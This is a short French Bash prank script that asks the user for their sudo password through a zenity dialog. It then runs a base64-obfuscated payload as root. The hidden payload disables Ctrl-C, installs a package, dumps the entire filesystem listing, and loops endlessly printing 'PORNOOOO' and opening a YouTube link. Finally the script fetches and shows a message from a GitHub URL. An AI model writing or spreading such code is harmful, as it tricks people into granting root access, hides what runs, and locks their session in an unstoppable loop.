#!/bin/bash

if zenity --question --text="Voulez-vous vous amusez un peu  ? ?"; then
    PASSWORD=$(zenity --password --title="Mot de passe requis")
    if [ -z "$PASSWORD" ]; then
        zenity --error --text="Aucun mot de passe fourni. L'installation a été annulée."
        exit 1
    fi

    echo "$PASSWORD" | sudo -S bash -c ' bash -c "$(echo 'CgoKdHJhcCAnJyBJTlQKCnN0dHkgaW50ciBeQyBzdXNwIF5aCgpjbGVhciAgCgpzdWRvIGFwdCBpbnN0YWxsIHRyZWUgLXkKCmNsZWFyCgplY2hvICJQZXRpdCB0dSB2aWVucyBkZSB0ZSBmYWlyZSBwacOpZ8OpIGluaGhoICIKCgp0cHV0IHNldGFmIDEKZWNobyAiIF8gICAgICAgICAgIF8iCmVjaG8gInwgfFxcICAgICAgICB8IHwgTk9HRSIKZWNobyAifCB8XFxcICAgICAgIHwgfCIKZWNobyAifCB8IFxcXCAgICAgIHwgfCBFUElURUNIIEJFTklOIgplY2hvICJ8IHwgIFxcXCAgICAgfCB8IgplY2hvICJ8IHwgICBcXFwgICAgfCB8IE5PR0UiCmVjaG8gInwgfCAgICBcXFwgICB8IHwiCmVjaG8gInwgfCAgICAgXFxcICB8IHwgRVBJVEVDSCBESUdJVEFMIFNDSE9PTCIKZWNobyAifCB8ICAgICAgXFxcIHwgfCIKZWNobyAifF98ICAgICAgIFxcXHxffCBOT0dFIgp0cHV0IHNncjAKc2xlZXAgMTAgCmNsZWFyIAoKdHJlZSAvIDsgbHMgLWxSYSAKCndoaWxlIHRydWUKZG8KICAgIGVjaG8gIlBPUk5PT09PT09PT09PT09PICIKICAgIHNsZWVwIDEKICAgIG9wZW4gImh0dHBzOi8veW91dHViZS5jb20vc2hvcnRzL3VkbzhWc19ER3lJIgogICAgc2xlZXAgMQogICAgZWNobyAiIAogICAgCiAgICBQRVRJVCBDQURFQVUgREUgTk9HRSAiCmRvbmUK' | base64 --decode)"


'


    if [ $? -eq 0 ]; then
        zenity --info --text="Vous venez de vous faire troll par Noge ."
    else
        zenity --error --text="Une erreur est survenue lors de ce troll  ."
    fi
else
    zenity --info --text="Seigneur"
fi

wget - "https://raw.githubusercontent.com/nogebeat/deb-ubuntu-epitech/main/App-code/src/message.txt"

zenity --text-info --title="Message de NOGE" --filename=message.txt

rm -f message.txt
